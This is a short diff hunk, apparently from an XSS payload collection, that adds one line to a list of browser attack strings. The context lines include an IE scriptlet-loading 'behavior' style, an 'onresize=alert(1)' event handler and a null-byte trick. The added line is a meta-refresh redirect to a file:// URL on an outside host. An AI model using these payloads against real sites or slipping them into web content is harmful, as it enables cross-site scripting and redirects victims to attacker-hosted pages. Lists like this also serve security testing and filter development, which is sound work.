@@ -131,3 +131,4 @@ something%00html
 <meta http-equiv="X-UA-Compatible" content="IE=5"><a style="font-family:}behavior=URL(\.sct)">B
 <meta http-equiv=x-ua-compatible content=ie=8>
 1<comment onresize=alert(1) contenteditable>1
+<meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
